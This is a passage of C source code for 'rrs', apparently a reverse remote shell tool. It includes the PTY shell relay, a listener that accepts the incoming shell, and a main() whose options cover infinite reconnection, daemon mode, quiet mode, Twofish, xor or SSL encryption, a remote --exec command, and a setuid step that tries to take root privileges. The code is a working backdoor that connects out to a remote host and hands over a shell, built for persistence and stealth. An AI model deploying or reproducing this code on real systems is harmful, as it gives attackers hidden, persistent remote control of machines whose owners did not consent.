                                            xorcrypt_read(sd, &ccbuf[(2+rlen)], 2 - rlen);
                                        } else {
                                            read(sd, &ccbuf[(2+rlen)], 2 - rlen);
                                        }
#if ! defined(WITHOUT_SSL)
                                    }
#endif
                                    ioctl(sd, FIONBIO, &On);    /* turn non-blocking IO back on */
                                }
                                wsize.ws_col = (unsigned short int)ccbuf[2];
                                wsize.ws_row = (unsigned short int)ccbuf[3];
                                wsize.ws_xpixel = wsize.ws_ypixel = 0;
                                ioctl(master_fd, TIOCSWINSZ, &wsize);
/*
                                kill(0, SIGWINCH);
 */
                                break;
                            default:
                                break;
                        }

                        /* write everything except the control sequence */
                        rlen = (unsigned long)memp - (unsigned long)buf;
                        if (rlen > 0) {
                            write(master_fd, buf, rlen);
                        }
                        rlen = ((unsigned long)buf + cnt) - ((unsigned long)memp + copied);
                        if (rlen > 0) {
                            write(master_fd, memp+copied, rlen);
                        }
                    } else {
                        write(master_fd, buf, cnt);
                    }
                }
            }
        }


        /*
         * restore signals to their default state
         */
        signal(SIGHUP, SIG_DFL);
        signal(SIGINT, SIG_DFL);
        signal(SIGQUIT, SIG_DFL);
        signal(SIGTERM, SIG_DFL);
        signal(SIGABRT, SIG_DFL);

#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_shutdown(ssl);  /* send TLS/SSL "close notify" */
        }
#endif
        close(sd);
        close(master_fd);
#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_free(ssl);
        }
#endif
        if (!silent) {
            printf("[i] connection closed to %s:%u (%s)\n", hostname, port, ascii_ip);
        }
    } else {
        /*
         * restore signals to their default state
         */
        signal(SIGHUP, SIG_DFL);
        signal(SIGINT, SIG_DFL);
        signal(SIGQUIT, SIG_DFL);
        signal(SIGTERM, SIG_DFL);
        signal(SIGABRT, SIG_DFL);

#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_shutdown(ssl);
        }
#endif
        close(sd);
        close(master_fd);
        close(slave_fd);
#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_free(ssl);
        }
#endif
        if (!silent) {
            perror("pork() on a fork()");
        }
        return err_generic;
    }

    return 0;
}


void listener_signalhandler(int signum) {
    switch(signum) {
        case SIGALRM:
            if (!silent) {
                fprintf(stderr, "[i] operation timed out!\n");
            }
            exit(err_timeout);
        case SIGHUP:
            /* ignore SIGHUP */
            break;
        case SIGINT:
        case SIGQUIT:
        case SIGTERM:
        case SIGABRT:
            if (usingtty) {
                /* restore terminal attributes */
                tcsetattr(0, TCSAFLUSH, &oldttyattr);
            }
            if (!silent) {
                fprintf(stderr, "[i] listener forcefully terminated!\n");
            }
            exit(0);
        case SIGWINCH:
            got_winch = 1;
            break;
        default:
            break;
    }
    signal(signum, listener_signalhandler);
    return;
}

int listener(int port) {
    int sd;
    socklen_t clilen;
    static int sopt = 1;
    struct sockaddr_in servAddr, cliAddr;

    if ((port < 1) || (port > 65535)) {
        if (!silent) {
            fprintf(stderr, "[?] port is not in the range 1-65535!\n");
        }
        return err_generic;
    }

    /*
     * save tty settings (if using tty)
     */

    if (usingtty) {
        /* save old tty attributes */
        tcgetattr(0, &oldttyattr);
        newttyattr = oldttyattr;
    }

    /*
     * install signalhandler
     */

    signal(SIGHUP, listener_signalhandler);
    signal(SIGINT, listener_signalhandler);
    signal(SIGQUIT, listener_signalhandler);
    signal(SIGTERM, listener_signalhandler);
    signal(SIGABRT, listener_signalhandler);


    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] cannot open socket: %s\n", strerror(errno));
        }
        return err_generic;
    }

    /* bind to port, any address */
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servAddr.sin_port = htons(port);

    /* set REUSEADDR socket option */
    if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &sopt, sizeof(sopt)) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] socketcall(): %s\n", strerror(errno));
        }
        close(sd);
        return err_generic;
    }
    /* call bind() */
    if (bind(sd, (struct sockaddr*) &servAddr, sizeof(servAddr)) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] bind() to port %i: %s\n", port, strerror(errno));
        }
        close(sd);
        return err_generic;
    }
    /* listen for incoming connections */
    if (listen(sd,1) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] listen(): %s\n", strerror(errno));
        }
        close(sd);
        return err_generic;
    }

    if (!silent) {
        if (!silent) {
            printf("[+] listening for incoming connection on port %u, ", port);
        }
        if (timeout) {
            if (!silent) {
                printf("timeout is %u seconds\n", timeout);
            }
        } else {
            if (!silent) {
                printf("no timeout\n");
            }
        }
    }

    if (timeout) {
        /* install a signal handler to timeout */
        signal(SIGALRM, listener_signalhandler);
        /* set alarm to go off at <timeout> seconds */
        alarm(timeout);
    }

    /* accept new connections, this will block */
    clilen = sizeof(cliAddr);
    if ((listener_clisd = accept(sd, (struct sockaddr *)&cliAddr, &clilen)) < 0) {
        if (!silent) {
            fprintf(stderr, "[?] accept(): %s\n", strerror(errno));
        }
        close(sd);
        return err_generic;
    }

    /* close listening socket, we won't need it */
    close(sd);

    /* uninstall signal handler for SIGALRM, we don't want it to time out now,
     * since we've got an open connection
     */
    signal(SIGALRM, SIG_IGN);

    if (!silent) {
        printf("[i] got connection from %s:%u\n",
            inet_ntoa(cliAddr.sin_addr), ntohs(cliAddr.sin_port));
    }

#if ! defined(WITHOUT_SSL)
    /**** if --ssl set up ssl ****/
    if (rrs_ssl) {
        if (!(ssl = SSL_new(sslctx))) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_new(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(listener_clisd);
            return err_generic;
        }
        if (!SSL_set_fd(ssl, listener_clisd)) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_set_fd(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(listener_clisd);
            SSL_free(ssl);
            return err_generic;
        }

        if (SSL_accept(ssl) <= 0) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_accept(): %s\n", ERR_reason_error_string(ERR_get_error()));
            }
            close(listener_clisd);
            SSL_free(ssl);
            return err_generic;
        }

        if (!silent) {
            printf("[i] ssl connection using cipher %s\n", SSL_get_cipher(ssl));
        }


        /**** get peer (connecting side) certificate ****/

        if (rrs_sslverify) {
            if (!(peer_cert = SSL_get_peer_certificate(ssl))) {
                if (!silent) {
                    fprintf(stderr, "[?] %s:%u did not present a certificate, turn check off with -v0\n",
                        inet_ntoa(cliAddr.sin_addr), ntohs(cliAddr.sin_port));
                }
                SSL_shutdown(ssl);
                close(listener_clisd);
                SSL_free(ssl);
                return err_generic;
            }

            /**** print certificate information ****/

            if (!silent) {
                unsigned int mdsha_size;
                unsigned char mdsha[EVP_MAX_MD_SIZE];

                printf("[i] connector (client) certificate information:\n");
                printf("... subject: %s\n", X509_NAME_oneline(X509_get_subject_name(peer_cert), 0, 0));
                printf("... issuer: %s\n", X509_NAME_oneline(X509_get_issuer_name(peer_cert), 0, 0));

                if (!X509_digest(peer_cert, EVP_md5(), mdsha, &mdsha_size)) {
                    if (!silent) {
                        fprintf(stderr, "[?] X509_digest\n");
                    }
                    X509_free(peer_cert);
                    SSL_shutdown(ssl);
                    close(listener_clisd);
                    SSL_free(ssl);
                    return err_generic;
                }
                printf("... md5 fingerprint: %s\n", convert2dotted_hex(mdsha, mdsha_size));

                if (!X509_digest(peer_cert, EVP_sha1(), mdsha, &mdsha_size)) {
                    if (!silent) {
                        fprintf(stderr, "[?] err\n");
                    }
                    X509_free(peer_cert);
                    SSL_shutdown(ssl);
                    close(listener_clisd);
                    SSL_free(ssl);
                    return err_generic;
                }
                printf("... sha1 fingerprint: %s\n", convert2dotted_hex(mdsha, mdsha_size));
            }

            X509_free(peer_cert);
        }
    }
    /**** end of SSL_accept ****/
#endif

    if (usingtty) {
        if (ioctl(STDIN_FILENO, TIOCGWINSZ, &wsize) < 0) {
            if (!silent) {
                fprintf(stderr, "[?] ioctl(TIOCGWINSZ): %s\n", strerror(errno));
            }
#if ! defined(WITHOUT_SSL)
            if (rrs_ssl) {
                SSL_shutdown(ssl);
            }
#endif
            close(listener_clisd);
#if ! defined(WITHOUT_SSL)
            if (rrs_ssl) {
                SSL_free(ssl);
            }
#endif
            return err_generic;
        }

        /* set terminal to raw mode */
/**** if I remember correctly, this is how netkit telnetd does it...
 **** rrs uses cfmakeraw() instead however.
        newttyattr.c_iflag |= IGNPAR;
        newttyattr.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
        newttyattr.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL);
        newttyattr.c_oflag &= ~OPOST;
        newttyattr.c_cc[VMIN] = 1;
        newttyattr.c_cc[VTIME] = 0;
*/
        cfmakeraw(&newttyattr);

        /* set new attributes */
        tcsetattr(0, TCSAFLUSH, &newttyattr);
    }

    /* send wsize rrs control command through the socket */
    /* 0xff, 0x01, 0x<col>, 0x<row> */

    gbuf[0] = cc_control_character;
    gbuf[1] = cc_command_wsize;
    gbuf[2] = (char)wsize.ws_col;
    gbuf[3] = (char)wsize.ws_row;

#if ! defined(WITHOUT_SSL)
    if (rrs_ssl) {
        SSL_write(ssl, gbuf, 4);
    } else {
#endif
        if (twofishkey) {
            farm9crypt_write(listener_clisd, gbuf, 4);
        } else if (xorkey) {
            xorcrypt_write(listener_clisd, gbuf, 4);
        } else {
            write(listener_clisd, gbuf, 4);
        }
#if ! defined(WITHOUT_SSL)
    }
#endif

    /* send through the --exec command line (if it exists) */
    if (remote_command) {
        unsigned char Nter[] = "\n";
#if ! defined(WITHOUT_SSL)
        if (rrs_ssl) {
            SSL_write(ssl, remote_command, strlen(remote_command));
            SSL_write(ssl, Nter, 1);
        } else {
#endif
            if (twofishkey) {
                farm9crypt_write(listener_clisd, remote_command, strlen(remote_command));
                farm9crypt_write(listener_clisd, Nter, 1);
            } else if (xorkey) {
                xorcrypt_write(listener_clisd, remote_command, strlen(remote_command));
                xorcrypt_write(listener_clisd, Nter, 1);
            } else {
                write(listener_clisd, remote_command, strlen(remote_command));
                write(listener_clisd, Nter, 1);
            }
#if ! defined(WITHOUT_SSL)
        }
#endif
    }


    if (usingtty) {
        /* trap window changes and send the new values through the socket with a rrs control command */
        got_winch = 0;
        signal(SIGWINCH, listener_signalhandler);
    }



    while(1) {
        fd_set fds;

        FD_ZERO(&fds);
        FD_SET(STDIN_FILENO, &fds);
        FD_SET(listener_clisd, &fds);

        if (got_winch) {
            signal(SIGWINCH, SIG_IGN);
            if (ioctl(STDIN_FILENO, TIOCGWINSZ, &wsize) >= 0) {
                /* prepare a rrs wsize control command */
                gbuf[0] = cc_control_character;
                gbuf[1] = cc_command_wsize;
                gbuf[2] = (unsigned char)wsize.ws_col;
                gbuf[3] = (unsigned char)wsize.ws_row;
                /* tell the other side to change size of her controlling tty */
#if ! defined(WITHOUT_SSL)
                if (rrs_ssl) {
                    SSL_write(ssl, gbuf, 4);
                } else {
#endif
                    if (twofishkey) {
                        farm9crypt_write(listener_clisd, gbuf, 4);
                    } else if (xorkey) {
                        xorcrypt_write(listener_clisd, gbuf, 4);
                    } else {
                        write(listener_clisd, gbuf, 4);
                    }
#if ! defined(WITHOUT_SSL)
                }
#endif
            }
            got_winch = 0;
            signal(SIGWINCH, listener_signalhandler);
        }

        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL)) {
            int cnt;
            if (got_winch)
                continue;
            if (FD_ISSET(STDIN_FILENO, &fds)) {
                if ((cnt = read(STDIN_FILENO, gbuf, sizeof(gbuf))) < 1) {
                    if (errno == EWOULDBLOCK || errno == EAGAIN)
                        continue;
                    else
                        break;
                }
#if ! defined(WITHOUT_SSL)
                if (rrs_ssl) {
                    SSL_write(ssl, gbuf, cnt);
                } else {
#endif
                    if (twofishkey) {
                        farm9crypt_write(listener_clisd, gbuf, cnt);
                    } else if (xorkey) {
                        xorcrypt_write(listener_clisd, gbuf, cnt);
                    } else {
                        write(listener_clisd, gbuf, cnt);
                    }
#if ! defined(WITHOUT_SSL)
                }
#endif
            }
            if (FD_ISSET(listener_clisd, &fds)) {
#if ! defined(WITHOUT_SSL)
                if (rrs_ssl) {
                    if ((cnt = SSL_read(ssl, gbuf, sizeof(gbuf))) <= 0) {
                        int err;
                        err = SSL_get_error(ssl, cnt);
                        if (err == SSL_ERROR_WANT_READ)
                            continue;
                        else
                            break;
                    }
                } else {
#endif
                    if (twofishkey) {
                        if ((cnt = farm9crypt_read(listener_clisd, gbuf, sizeof(gbuf))) < 1) {
                            if (errno == EWOULDBLOCK || errno == EAGAIN)
                                continue;
                            else
                                break;
                        }
                    } else if (xorkey) {
                        if ((cnt = xorcrypt_read(listener_clisd, gbuf, sizeof(gbuf))) < 1) {
                            if (errno == EWOULDBLOCK || errno == EAGAIN)
                                continue;
                            else
                                break;
                        }
                    } else {
                        if ((cnt = read(listener_clisd, gbuf, sizeof(gbuf))) < 1) {
                            if (errno == EWOULDBLOCK || errno == EAGAIN)
                                continue;
                            else
                                break;
                        }
                    }
#if ! defined(WITHOUT_SSL)
                }
#endif
                write(STDOUT_FILENO, gbuf, cnt);
            }
        }
    }


    /*
     * restore signals to their default state
     */

    signal(SIGHUP, SIG_DFL);
    signal(SIGINT, SIG_DFL);
    signal(SIGQUIT, SIG_DFL);
    signal(SIGTERM, SIG_DFL);
    signal(SIGABRT, SIG_DFL);


#if ! defined(WITHOUT_SSL)
    if (rrs_ssl) {
        SSL_shutdown(ssl);
    }
#endif
    close(listener_clisd);
#if ! defined(WITHOUT_SSL)
    if (rrs_ssl) {
        SSL_free(ssl);
    }
#endif
    if (usingtty) {
        /* restore terminal attributes */
        tcsetattr(0, TCSAFLUSH, &oldttyattr);
    }

    return 0;
}


void usage(void) {
    printf(banner, get_revision(rcsid));
    printf("%s%s", rcsid, helptext);
}

void print_license(void) {
    unsigned char license[] =
    "\n"
    "Permission is hereby granted, free of charge, to any person obtaining a copy\n"
    "of this software and associated documentation files (the \"Software\"), to deal\n"
    "in the Software without restriction, including without limitation the rights\n"
    "to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n"
    "copies of the Software, and to permit persons to whom the Software is\n"
    "furnished to do so, subject to the following conditions:\n"
    "\n"
    "The above copyright notice and this permission notice shall be included in all\n"
    "copies or substantial portions of the Software.\n"
    "\n"
    "THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n"
    "IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n"
    "FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n"
    "AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n"
    "LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n"
    "OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n"
    "SOFTWARE.\n"
    "\n"
    "Twofish implementation Copyright (c) 1995-2001 The Cryptix Foundation\n"
    "Limited. Twofish API (farm9crypt) by jojo@farm9.com. Twofish encryption was\n"
    "derived from cryptcat.\n"
    "\n"
    "Independent implementation of MD5 (RFC 1321) Copyright (C) 1999, 2000,\n"
    "2002 Aladdin Enterprises.\n"
    "\n"
    "The SHA1 implementation is Copyright (C) 2000 by Peter Selinger and is\n"
    "distributed under the GNU General Public License (GPL).\n"
    "\n";

    printf(banner, get_revision(rcsid));
    printf("%s%s", license, rcsid);
}

void print_version(void) {
    printf(banner, get_revision(rcsid));
    printf("%s", rcsid);
}

/******************************************************************************
* main()
******************************************************************************/

int main(int argc, char **argv) {
    int i, err = 0;
#if ! defined(WITHOUT_SSL)
    int x;
#endif
    char *hostname = NULL;
    pid_t pid;

    char **cafiles = 0;

#if ! defined(WITHOUT_GNU_GETOPT)
    int option_index = 0;
    static struct option long_options[] = {
        {"help",        0,0,'h'},
        {"listen",      0,0,'l'},
        {"port",        1,0,'p'},
        {"source-port", 1,0,'b'},
        {"reconnect",   1,0,'r'},
        {"infinite-reconnect",  1,0,'R'},
        {"timeout",     1,0,'t'},
        {"daemon",      0,0,'D'},
        {"quiet",       0,0,'q'},
        {"twofishkey",  1,0,'k'},
        {"xorkey",      1,0,'x'},
#if ! defined(WITHOUT_SSL)
        {"ssl",         2,0,'S'},
        {"pem",         1,0,'P'},
        {"cipher",      1,0,'c'},
        {"verify",      1,0,'v'},
        {"ca",          1,0,'C'},
        {"crl",         1,0,'C'},
#endif
        {"exec",        1,0,'e'},
        {"monitor",     0,0,'m'},
        {"setuid",      0,0,'0'},
        {"license",     0,0,'L'},
        {"version",     0,0,'V'},
        {0,0,0,0}
    };
#endif


    /* init the cafiles array */
    if (!(cafiles = malloc(sizeof(char *)*1))) {
        fprintf(stderr, "[?] couldn't malloc(): %s\n", strerror(errno));
        return 1;
    }
    cafiles[0] = 0;


    /* we set up unbuffered streams if stdout or stderr is not a tty */
    if ((!isatty(STDOUT_FILENO)) || (!isatty(STDERR_FILENO))) {
        setvbuf(stdout, NULL, _IONBF, 0);
        /* stderr is supposed to be unbuffered by default on most systems, but
         * we don't trust that */
        setvbuf(stderr, NULL, _IONBF, 0);
    }


#if ! defined(WITHOUT_GNU_GETOPT)
    while ((i = getopt_long(argc, argv, "hlp:b:r:R:t:Dqk:x:sS:P:c:v:C:e:m0LV", long_options, &option_index)) != -1) {
#else
         while ((i = getopt(argc, argv, "hlp:b:r:R:t:Dqk:x:sS:P:c:v:C:e:m0LV")) != -1) {
#endif
        switch (i) {
            case 'h':
                usage();
                return 1;
            case 'l':
                rrs_listen = 1;
                break;
            case 'p':
                lport = atoi(optarg);
                cport = lport;
                break;
            case 'b':
                sourceport = atoi(optarg);
                break;
            case 'r':
                reconnect = atoi(optarg);
                infinite_reconnect = 0;
                break;
            case 'R':
                reconnect = atoi(optarg);
                infinite_reconnect = reconnect;
                break;
            case 't':
                timeout = atoi(optarg);
                break;
            case 'D':
                rrs_daemon = 1;
                break;
            case 'q':
                silent = 1;
                break;
            case 'k':
#if ! defined(WITHOUT_SSL)
                if (rrs_ssl || xorkey) {
#else
                if (xorkey) {
#endif
                    fprintf(stderr, "[?] you can only choose one encryption method!\n");
                    return 1;
                }
                if (!twofishkey) {
                    if ((twofishkey = strdup(optarg)) == NULL) {
                        fprintf(stderr, "[?] strdup(optarg): %s\n", strerror(errno));
                        return 1;
                    }
                }
                break;
            case 'x':
#if ! defined(WITHOUT_SSL)
                if (rrs_ssl || twofishkey) {
#else
                if (twofishkey) {
#endif
                    fprintf(stderr, "[?] you can only choose one encryption method!\n");
                    return 1;
                }
                if (!xorkey) {
                    if ((xorkey = strdup(optarg)) == NULL) {
                        fprintf(stderr, "[?] strdup(optarg): %s\n", strerror(errno));
                        return 1;
                    }
                }
                break;
#if ! defined(WITHOUT_SSL)
            case 's':
                if (twofishkey || xorkey) {
                    fprintf(stderr, "[?] you can only choose one encryption method!\n");
                    return 1;
                }
                if (!rrs_ssl)
                    rrs_ssl = TLSv1;
                break;
            case 'S':
                if (twofishkey || xorkey) {
                    fprintf(stderr, "[?] you can only choose one encryption method!\n");
                    return 1;
                }
                rrs_ssl = TLSv1;
                if (optarg) {
                    if (!strcasecmp(optarg, "SSLv2")) {
                        rrs_ssl = SSLv2;
                    } else if (!strcasecmp(optarg, "SSLv3")) {
                        rrs_ssl = SSLv3;
                    } else if (!strcasecmp(optarg, "TLSv1")) {
                        rrs_ssl = TLSv1;
                    } else {
                        fprintf(stderr, "[?] not supported ssl protocol: %s\n", optarg);
                        return 1;
                    }
                }
                break;
            case 'P':
                keyfile = strdup(optarg);
                break;
            case 'c':
                cipher = strdup(optarg);
                break;
            case 'v':
                rrs_sslverify = atoi(optarg);
                break;
            case 'C':
                /* dynamically add another entry to the cafiles array */
                x = 0;
                while (cafiles[x] != NULL) {
                    x++;
                }
                if (!(cafiles = realloc(cafiles, sizeof(char *) * (x+2)))) {
                    fprintf(stderr, "[?] couldn't realloc(): %s\n", strerror(errno));
                    return 1;
                }
                if (!(cafiles[x] = strdup(optarg))) {
                    fprintf(stderr, "[?] couldn't strdup(): %s\n", strerror(errno));
                    return 1;
                }
                cafiles[x+1] = 0;
                break;
#endif
            case 'e':
                remote_command = strdup(optarg);
                break;
            case 'm':
                monitor = 1;
                break;
            case '0':
                set_effective_uid = 1;
                break;
            case 'L':
                print_license();
                return 0;
            case 'V':
                print_version();
                return 0;
            case '?':
            case ':':
                fprintf(stderr, "[?] type \"rrs -h\" for help\n");
                return 1;
            default:
                usage();
                return 1;
        }
    }


    if ((!isatty(STDIN_FILENO)) || (!isatty(STDOUT_FILENO)) || (!isatty(STDERR_FILENO))) {
        usingtty = 0;
    } else {
        usingtty = 1;
    }


    if (!rrs_listen) {      /* error-check the connector's parameters */
        if (optind < argc) {
            hostname = strdup(argv[optind++]);
            if (optind < argc)
                cport = atoi(argv[optind]);
        } else {
            usage();
            return 1;
        }

        if (hostname == NULL) {
            usage();
            return 1;
        }
    }


    /* do we want to try setuid(geteuid()) ? */
    if (set_effective_uid) {
        if (getuid() != geteuid()) {
            if (!silent) {
                printf("[+] trying setuid(%i): ", geteuid());
            }
            if (setuid(geteuid())) {
                if (!silent)
                    printf("%s\n", strerror(errno));
            } else {
                if (!silent)
                    printf("ok\n");
            }
        }

        if (getuid() == 0) {
            /* if we're already root, give root all the way */
            if (!silent)
                printf("[+] got r00t, trying setgid(0): ");

            if (setgid(0)) {
                if (!silent)
                    printf("%s\n", strerror(errno));
            } else {
                if (!silent)
                    printf("ok\n");
            }
        } else {
            if (getgid() != getegid()) {
                if (!silent) {
                    printf("[+] trying setgid(%i): ", getegid());
                }
                if (setgid(getegid())) {
                    if (!silent)
                        printf("%s\n", strerror(errno));
                } else {
                    if (!silent)
                        printf("ok\n");
                }
            }
        }
    }


    /* warn if offering a root shell */

    if ((getuid() == 0) && (!rrs_listen)) {
        if (!silent)
            printf("[i] **warning** you are offering a r00t shell to the peer!\n");
    }


#if ! defined(WITHOUT_SSL)
    if (rrs_ssl) {
        if (rrs_sslverify || rrs_listen) {
            if (!keyfile) {
                if (!silent) {
                    fprintf(stderr, "[?] no private/public key file provided!\n");
                }
                return err_generic;
            }
        }

        SSL_library_init();
        SSL_load_error_strings();

        if (rrs_listen) {
            if (rrs_ssl == SSLv2) {
                sslmethod = SSLv2_server_method();
            } else if (rrs_ssl == SSLv3) {
                sslmethod = SSLv3_server_method();
            } else if (rrs_ssl == TLSv1) {
                sslmethod = TLSv1_server_method();
            } else {
                fprintf(stderr, "[?] huh? rrs_ssl = 0x%08x\n", (unsigned int)sslmethod);
                return err_generic;
            }
        } else {
            if (rrs_ssl == SSLv2) {
                sslmethod = SSLv2_client_method();
            } else if (rrs_ssl == SSLv3) {
                sslmethod = SSLv3_client_method();
            } else if (rrs_ssl == TLSv1) {
                sslmethod = TLSv1_client_method();
            } else {
                fprintf(stderr, "[?] huh? rrs_ssl = 0x%08x\n", (unsigned int)sslmethod);
                return err_generic;
            }
        }

        if (!(sslctx = SSL_CTX_new(sslmethod))) {
            if (!silent) {
                fprintf(stderr, "[?] SSL_CTX_new() failed!\n");
            }
            return err_generic;
        }

        if (cipher) {
            if (!SSL_CTX_set_cipher_list(sslctx, cipher)) {
                if (!silent) {
                    fprintf(stderr, "[?] SSL_CTX_set_cipher_list() failed\n");
                }
                return err_generic;
            }
        }

        if (rrs_sslverify || rrs_listen) {

            /**** open cert and private key file (the same file) ****/

            if (SSL_CTX_use_PrivateKey_file(sslctx, keyfile, SSL_FILETYPE_PEM) != 1) {
                if (!silent) {
                    fprintf(stderr, "[?] private key file %s error: %s\n", keyfile, ERR_reason_error_string(ERR_get_error()));
                }
                return err_generic;
            }
            if (SSL_CTX_use_certificate_chain_file(sslctx, keyfile) != 1) {
                if (!silent) {
                    fprintf(stderr, "[?] certificate file %s error: %s\n", keyfile, ERR_reason_error_string(ERR_get_error()));
                }
                return err_generic;
            }

            /**** load certificates we trust ****/

            if (!(SSL_CTX_load_verify_locations(sslctx, keyfile, NULL))) {
                if (!silent) {
                    fprintf(stderr, "[?] certificate chain file %s error: %s\n", keyfile, ERR_reason_error_string(ERR_get_error()));
                }
                return err_generic;
            }

            /**** we'll load and trust each cafile specified on the command line ****/

            x = 0;
            while (cafiles[x] != NULL) {
                #if OPENSSL_VERSION_NUMBER >= 0x00907000L
                FILE *cafp;
                /*
                 * The default verify callback in OpenSSL will fail if
                 * X509_V_FLAG_CRL_CHECK is set and there is no CRL loaded. We
                 * want that if there's no CRL loaded, there's no CRL
                 * checking. In order to use the default OpenSSL verify
                 * callback, we need to open each --ca file specified on the
                 * command line and check if one of them is/contains a CRL. If
                 * it does contain a CRL, CRL checking is enabled (with the
                 * we_got_a_crl flag). The function find_x509_crl() above will
                 * attempt to identify a CRL.
                 */
                    if (!we_got_a_crl) {
                        if (!(cafp = fopen(cafiles[x], "rb"))) {
                            if (!silent) {
                                fprintf(stderr, "[?] couldn't open %s: %s\n", cafiles[x], strerror(errno));
                            }
                            return err_generic;
                        }
                        foreachline(cafp, find_x509_crl);
                        fclose(cafp);
                    }
                #endif

                if (!(SSL_CTX_load_verify_locations(sslctx, cafiles[x], NULL))) {
                    if (!silent) {
                        fprintf(stderr, "[?] certificate chain / crl file %s error: %s\n", cafiles[x], ERR_reason_error_string(ERR_get_error()));
                    }
                    return err_generic;
                }
                x++;
            }

            #if OPENSSL_VERSION_NUMBER >= 0x00907000L
                if (we_got_a_crl) {
                    /* set the X509_V_FLAG_CRL_CHECK flag if we've loaded a CRL file */
                    sslstore = SSL_CTX_get_cert_store(sslctx);
                    X509_STORE_set_flags(sslstore, X509_V_FLAG_CRL_CHECK);
                }
            #endif

            /**** check consistency of a private key and corresponding certificate ****/
            if (SSL_CTX_check_private_key(sslctx) != 1) {
                if (!silent) {
                    fprintf(stderr, "[?] private key / certificate consistency: %s\n", ERR_reason_error_string(ERR_get_error()));
                }
                return err_generic;
            }
        }

        if (rrs_sslverify) {
            SSL_CTX_set_verify(sslctx, SSL_VERIFY_PEER, NULL);
        }
    }
#endif

    /**** init twofish, if we're using it ****/

    if (twofishkey) {
        if (!strcmp("-", twofishkey)) { /* if -k- we're going to read from stdin */
            printf("[+] enter key-phrase for twofish: ");
            fflush(stdout);
            fgets(gbuf, sizeof(gbuf)-1, stdin);
            removechar(gbuf, 0x0a);
            removechar(gbuf, 0x0d);
            removechar(gbuf, EOF);
            free(twofishkey);   /* this is safe, it's already been allocated */
            if ((twofishkey = strdup(gbuf)) == NULL) {
                fprintf(stderr, "[?] strdup(gbuf): %s\n", strerror(errno));
                return 1;
            }
        }
        if (!strlen(twofishkey)) {
            fprintf(stderr, "[?] twofish key can not be empty!\n");
            return 1;
        }
        if (farm9crypt_initialized() == 0) {
            farm9crypt_init(twofishkey);
        }
    }

    /**** init xorcrypt, if we're using it ****/

    if (xorkey) {
        if (!strcmp("-", xorkey)) { /* if -x- we're going to read from stdin */
            printf("[+] enter key-phrase for (weak) xorcrypt: ");
            fflush(stdout);
            fgets(gbuf, sizeof(gbuf)-1, stdin);
            removechar(gbuf, 0x0a);
            removechar(gbuf, 0x0d);
            removechar(gbuf, EOF);
            free(xorkey);   /* this is safe, it's already been allocated */
            if ((xorkey = strdup(gbuf)) == NULL) {
                fprintf(stderr, "[?] strdup(gbuf): %s\n", strerror(errno));
                return 1;
            }
        }
        if (!xorkey[0]) {
            fprintf(stderr, "[?] xorcrypt key can not be empty!\n");
            return 1;
        }

        /* initialize xorcrypt with sha1+md5 hash */
        xorcrypt_init(generate_xorcrypt_key(xorkey));
    }



    if (rrs_daemon) {
        if (rrs_listen) {
            fprintf(stderr, "[?] you can't run the listener in daemon mode!\n");
            return err_generic;
        }

        /*
         * daemon mode means to fork and exit the parent, the child continues
         * the execution after this if-statement.
         */

        /* --daemon automatically implies --quiet */
        silent = 1;
        /* --monitor has to be disabled */
        monitor = 0;

        pid = fork();
        if (pid > 0) {
            return 0;
        } else if (pid < 0) {
            fprintf(stderr, "[?] fork(): %s\n", strerror(errno));
            return err_generic;
        }
    }


#if ! defined(WITHOUT_SSL)
    if (rrs_ssl && (!silent)) {
        printf("[i] using %s encrypted communication\n", (char *)sslprotocols[rrs_ssl]);
        if (!rrs_sslverify) {
            printf("[i] certificate verification is off!\n");
        }
    } else
#endif
    if (twofishkey && (!silent)) {
        printf("[i] using built-in Twofish encrypted communication\n");
    } else if (xorkey && (!silent)) {
        printf("[i] using (weak) xor encrypted communication\n");
    } else if (!silent) {
        printf("[i] using plain-text communication\n");
    }


    if (rrs_listen) {
        err = listener(lport);
    } else {
        if (monitor && (!silent)) {
            printf("[i] session will be monitored\n");
        }
        if (reconnect || infinite_reconnect) {
            loop_it_sam:
                while ((err = connecting_pty_shell(hostname, cport)) == err_connect) {
                    sleep(reconnect);
                }
            if (infinite_reconnect) {
                sleep(reconnect);
                goto loop_it_sam;
            }
        } else {
            err = connecting_pty_shell(hostname, cport);
        }
    }

#if ! defined(WITHOUT_SSL)
    if (rrs_ssl) {
        SSL_CTX_free(sslctx);
    }
#endif

    return err;
}
